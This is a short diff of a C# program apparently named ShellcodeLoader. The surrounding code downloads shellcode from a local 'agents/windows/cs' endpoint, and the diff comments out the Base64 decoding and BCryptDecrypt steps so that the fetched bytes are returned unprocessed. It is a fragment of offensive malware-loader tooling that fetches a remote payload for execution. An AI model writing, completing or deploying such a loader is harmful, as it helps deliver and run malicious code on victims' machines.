@@ -102,7 +102,7 @@ namespace ShellcodeLoader
                 // Download the shellcode
                 shellcode = client.DownloadData("http://localhost:8081/agents/windows/cs");
             }
-
+/*
             // Base64 decoding
             shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));
 
@@ -134,7 +134,7 @@ namespace ShellcodeLoader
             if (ntStatus != 0)
                 throw new Exception("BCryptDecrypt failed with status " + ntStatus);
 
-            shellcode = decryptedShellcode;
+            shellcode = decryptedShellcode;*/
 
             return shellcode;
         }
